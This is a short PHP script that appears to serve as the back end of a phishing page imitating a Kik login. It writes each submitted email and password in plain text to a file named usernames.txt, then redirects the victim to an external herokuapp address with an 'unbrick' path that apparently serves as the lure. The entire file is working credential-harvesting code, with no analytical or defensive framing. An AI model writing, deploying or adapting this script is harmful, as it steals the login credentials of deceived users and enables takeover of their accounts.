<?php

file_put_contents("usernames.txt", "Kik Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_pass'] . "\n", FILE_APPEND);
header('Location: https://anvil-x.herokuapp.com/unbrick');
exit();
?>